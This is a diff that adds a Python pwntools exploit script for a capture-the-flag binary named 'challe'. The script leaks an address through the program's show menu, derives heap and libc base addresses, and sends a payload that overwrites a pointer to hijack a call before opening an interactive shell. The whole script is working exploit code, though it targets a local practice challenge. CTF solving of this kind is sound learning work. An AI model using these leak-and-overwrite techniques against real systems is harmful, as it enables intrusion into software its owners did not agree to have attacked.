@@ -1,0 +1,64 @@
+#!/usr/bin/env python3
+from pwn import *
+import warnings
+warnings.filterwarnings("ignore")
+exe = ELF("./challe",checksec=False)
+libc = ELF("./libc.so.6",checksec=False)
+ld = ELF("./ld-linux-x86-64.so.2",checksec=False)
+# context.log_level='debug'
+# p = remote("addr", 1337)
+p = process([exe.path])
+def gdbs():
+    context.terminal = ["foot"]
+    gdb.attach(p, gdbscript="""
+
+               """)
+    # p = gdb.debug([exe.path],"""
+    #
+    #
+    #                 """)
+    # return p 
+
+sla = lambda msg, data: p.sendlineafter(msg, data)
+sa = lambda msg, data: p.sendafter(msg, data)
+sl = lambda data: p.sendline(data)
+s = lambda data: p.send(data)
+def reg(age,name,des):
+    sla(">>","1")
+    sla("?",age)
+    sla("?",name)
+    sla("?",des)
+def show(idx):
+    sla(">>","2")
+    sla("?",str(idx))
+chunk = 16
+reg("+","the first","chunk")
+reg("+","lmao","lmao")
+show(1)
+p.recvuntil("Age: ")
+addr = int(p.recvline())
+hit_base = addr - 0xe2000e0
+log.info(f"{hex(hit_base) = }")
+log.info(f"{hex(addr) = }")
+libc.address = addr + 0x151fff20
+log.info(f"{hex(libc.address) = }")
+call = libc.address + 0x21a0b8
+log.info(f"{hex(call) = }")
+# for i in range(100):
+payload =  b"a"*0x10  + p64(call)
+payload = payload.ljust(0x20,b"a")
+reg("+","a"*16,payload)
+gdbs()
+reg("+","a"*16,"b"*32)
+reg("+","a"*16,"c"*32)
+target_address = 1337
+reg(str(target_address),"a"*16,"d"*32) # <- call here
+
+
+
+
+
+
+p.interactive()
+# good luck pwning :)
+
